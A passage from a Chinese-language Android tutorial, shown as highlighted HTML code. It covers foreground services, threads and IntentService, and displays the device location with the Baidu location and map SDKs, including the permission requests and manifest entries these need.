NotificationCompat.Builder(<span class="keyword">this</span>, CHANNEL_ID);</span><br><span class="line">        builder.setSmallIcon(R.drawable.ic_launcher_background) <span class="comment">//设置通知图标</span></span><br><span class="line">                .setContentTitle(<span class="string">&quot;notificationTitle&quot;</span>)<span class="comment">//设置通知标题</span></span><br><span class="line">                .setContentText(<span class="string">&quot;notificationContent&quot;</span>)<span class="comment">//设置通知内容</span></span><br><span class="line">                .setAutoCancel(<span class="keyword">true</span>) <span class="comment">//用户触摸时，自动关闭</span></span><br><span class="line">                .setOngoing(<span class="keyword">true</span>);<span class="comment">//设置处于运行状态</span></span><br><span class="line">        <span class="comment">//向系统注册通知渠道，注册后不能改变重要性以及其他通知行为</span></span><br><span class="line">        NotificationManager notificationManager = (NotificationManager) getSystemService( Context.NOTIFICATION_SERVICE);</span><br><span class="line">        notificationManager.createNotificationChannel(channel);</span><br><span class="line">        <span class="comment">//将服务置于启动状态 NOTIFICATION_ID指的是创建的通知的ID</span></span><br><span class="line">        startForeground(NOTIFICATION_ID,builder.build());<span class="comment">//两个参数int,Notification，启用前台服务函数，第一个参数是通知id，第二个是通知</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload: &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress: &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate: &quot;</span>);</span><br><span class="line">        <span class="comment">//调用启动前台函数</span></span><br><span class="line">        setForegroundService();<span class="comment">//修改点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onStartCommand: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onDestroy: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Manifest.xml 别忘了增加前台通知的权限，因为不属于危险权限只需声明，无需运行时权限--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.FOREGROUND_SERVICE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="安卓多线程"><a href="#安卓多线程" class="headerlink" title="安卓多线程"></a>安卓多线程</h3><p>服务中的代码都是默认运行在主线程当中的，如果直接在服务里去处理一些耗时的逻辑，就很容易出现ANR（Application Not Responding）的情况。</p>
<p>所以这个时候就需要用到Android多线程编程的技术了，我们应该在服务的每个具体的方法里开启一个子线程，然后在这里去处理那些耗时的逻辑。因此，一个比较标准的服务就可以写成如下形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;  </span><br><span class="line">            <span class="meta">@Override</span>  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，这种服务一旦启动之后，就会一直处于运行状态，必须调用<code>stopService()</code> 或者<code>stopSelf()</code> 方法才能让服务停止下来。所以，如果想要实现让一个服务在执行完毕后自动停止的功能，就可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">                stopSelf();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用IntentSevice来管理线程"><a href="#使用IntentSevice来管理线程" class="headerlink" title="使用IntentSevice来管理线程"></a>使用IntentSevice来管理线程</h3><p>自动开启和关闭线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity,添加一个case,点击按钮</span></span><br><span class="line">Intent intentService = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyIntentService.class);</span><br><span class="line">                startService(intentService);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新建一个类继承自IntentService</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyIntentService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">&quot;MyIntentService&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(<span class="meta">@Nullable</span> Intent intent)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;Thread id is &quot;</span>+Thread.currentThread().getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;onDestroy executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="百度定位SDK"><a href="#百度定位SDK" class="headerlink" title="百度定位SDK"></a>百度定位SDK</h2><h4 id="获取经纬度信息，地址描述"><a href="#获取经纬度信息，地址描述" class="headerlink" title="获取经纬度信息，地址描述"></a>获取经纬度信息，地址描述</h4><p><strong>导入第三方jar包放在/app/libs目录后需要右键鼠标add as library..</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line">    <span class="keyword">public</span> LocationClient mLocationClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TextView positionText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"><span class="comment">//          声明LocationClient类</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line"><span class="comment">//        注册监听函数</span></span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        positionText = (TextView) findViewById(R.id.position_text_view);</span><br><span class="line">        List&lt;String&gt; permissionList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//        申请权限，访问位置</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        申请权限，读取手机状态</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.READ_PHONE_STATE);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        申请权限，写存储</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!permissionList.isEmpty()) &#123;</span><br><span class="line">            String [] permissions = permissionList.toArray(<span class="keyword">new</span> String[permissionList.</span><br><span class="line">                    size()]);</span><br><span class="line">            ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, permissions, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            requestLocation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> result : grantResults) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;必须同意所有权限才能使用本程序&quot;</span>,</span><br><span class="line">                                    Toast.LENGTH_SHORT).show();</span><br><span class="line">                            finish();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    requestLocation();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;发生未知错误&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line"><span class="comment">//        每隔五秒刷新定位</span></span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//        强制使用gps定位</span></span><br><span class="line"><span class="comment">//        option.setLocationMode(LocationClientOption.LocationMode.Device_Sensors);</span></span><br><span class="line">        option.setIsNeedAddress(<span class="keyword">true</span>);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initLocation();</span><br><span class="line"><span class="comment">//        调用LocationClient的start()方法，便可发起定位请求</span></span><br><span class="line">        mLocationClient.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    baidu sdk v7.2起的新调用接口，异步实现，这里我改了原作者的代码，因为虽然还能用但百度官方文档推荐使用此方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocationListener</span> <span class="keyword">extends</span> <span class="title">BDAbstractLocationListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveLocation</span><span class="params">(BDLocation location)</span> </span>&#123;</span><br><span class="line">            runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    StringBuilder currentPosition = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;纬度：&quot;</span>).append(location.getLatitude()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;经线：&quot;</span>).append(location.getLongitude()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;国家：&quot;</span>).append(location.getCountry()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;省：&quot;</span>).append(location.getProvince()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;市：&quot;</span>).append(location.getCity()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;区：&quot;</span>).append(location.getDistrict()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;街道：&quot;</span>).append(location.getStreet()).</span><br><span class="line">                            append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    currentPosition.append(<span class="string">&quot;定位方式：&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (location.getLocType() == BDLocation.TypeGpsLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;GPS&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (location.getLocType() ==</span><br><span class="line">                            BDLocation.TypeNetWorkLocation) &#123;</span><br><span class="line">                        currentPosition.append(<span class="string">&quot;网络&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    positionText.setText(currentPosition);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        每五秒刷新会非常的耗电，所以在程序运行结束后停止定位</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        mLocationClient.stop();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--sdk所需权限--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;com.baidu.location.f&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:process</span>=<span class="string">&quot;:remote&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="显示百度地图并定位到当前位置"><a href="#显示百度地图并定位到当前位置" class="headerlink" title="显示百度地图并定位到当前位置"></a>显示百度地图并定位到当前位置</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//　百度定位sdk文档　http://lbsyun.baidu.com/index.php?title=android-locsdk/guide/get-location/latlng</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    百度地图对象</span></span><br><span class="line">    <span class="keyword">private</span> BaiduMap baiduMap;</span><br><span class="line"><span class="comment">//    用于地图上显示当前位置小蓝点的初始化变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isFirstLocate = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">//    显示地图用的变量</span></span><br><span class="line">    <span class="keyword">private</span> MapView mapView;</span><br><span class="line"><span class="comment">//    定位用的变量</span></span><br><span class="line">    <span class="keyword">public</span> LocationClient mLocationClient;</span><br><span class="line"><span class="comment">//　　存放定位信息的系统ＵＩ TextView</span></span><br><span class="line"><span class="comment">//    private TextView positionText;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    定位到当前位置，并以小蓝点显示</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">navigateTo</span><span class="params">(BDLocation location)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isFirstLocate) &#123;</span><br><span class="line">            LatLng ll = <span class="keyword">new</span> LatLng(location.getLatitude(), location.getLongitude());</span><br><span class="line">            MapStatusUpdate update = MapStatusUpdateFactory.newLatLng(ll);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            update = MapStatusUpdateFactory.zoomTo(<span class="number">16f</span>);</span><br><span class="line">            baiduMap.animateMapStatus(update);</span><br><span class="line">            isFirstLocate = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        MyLocationData.Builder locationBuilder = <span class="keyword">new</span> MyLocationData.Builder();</span><br><span class="line">        locationBuilder.latitude(location.getLatitude());</span><br><span class="line">        locationBuilder.longitude(location.getLongitude());</span><br><span class="line">        MyLocationData locationData = locationBuilder.build();</span><br><span class="line">        baiduMap.setMyLocationData(locationData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"><span class="comment">//          声明LocationClient类</span></span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line"><span class="comment">//        注册监听函数</span></span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        positionText = (TextView) findViewById(R.id.position_text_view);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    显示地图</span></span><br><span class="line">        SDKInitializer.initialize(getApplicationContext());</span><br><span class="line"></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mapView = (MapView) findViewById(R.id.bmapView) ;</span><br><span class="line"></span><br><span class="line">        baiduMap = mapView.getMap();</span><br><span class="line"></span><br><span class="line">        baiduMap.setMyLocationEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; permissionList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//        申请权限，访问位置</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        申请权限，读取手机状态</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.READ_PHONE_STATE);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        申请权限，写存储</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">                permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!permissionList.isEmpty()) &#123;</span><br><span class="line">            String [] permissions = permissionList.toArray(<span class="keyword">new</span> String[permissionList.</span><br><span class="line">                    size()]);</span><br><span class="line">            ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, permissions, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            requestLocation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        mapView.onResume();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        mapView.onPause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> result : grantResults) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;必须同意所有权限才能使用本程序&quot;</span>,</span><br><span class="line">                                    Toast.LENGTH_SHORT).show();</span><br><span class="line">                            finish();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    requestLocation();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;发生未知错误&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    finish();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">        LocationClientOption option = <span class="keyword">new</span> LocationClientOption();</span><br><span class="line"><span class="comment">//        每隔五秒刷新定位</span></span><br><span class="line">        option.setScanSpan(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//        强制使用gps定位</span></span><br><span class="line"><span class="comment">//        option.setLocationMode(LocationClientOption.LocationMode.Device_Sensors);</span></span><br><span class="line">        option.setIsNeedAddress(<span class="keyword">true</span>);</span><br><span class="line">        mLocationClient.setLocOption(option);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initLocation();</span><br><span class="line"><span class="comment">//        调用LocationClient的start()方法，便可发起定位请求</span></span><br><span 